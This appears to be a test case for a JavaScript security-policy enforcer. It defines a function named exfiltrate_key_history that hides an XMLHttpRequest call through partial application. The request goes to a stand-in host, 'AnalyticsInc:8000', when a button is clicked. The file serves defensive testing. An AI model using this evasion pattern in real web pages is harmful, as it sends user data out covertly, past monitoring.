// exfil_test_partial.js
function exfiltrate_key_history() {
  function partial(func$$3) {
    function v0() {
      var v5 = Array.prototype.slice;
      var allArguments = JAM.call(args.concat, args, [JAM.call(v5.call, v5, [arguments], JAM.policy.p1)], JAM.policy.p1);
      return JAM.call(func$$3.apply, func$$3, [this, allArguments], JAM.policy.p1);
    }
    var v2 = Array.prototype.slice;
    var args = JAM.call(v2.call, v2, [arguments, 1], JAM.policy.p1);
    return v0;
  }
  xmlhttp = new XMLHttpRequest;
  var v3 = xmlhttp;
  var v9 = partial(xmlhttp.open, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
  v3.openn = v9;
  JAM.call(xmlhttp.openn, xmlhttp, [], JAM.policy.p1);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p1);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
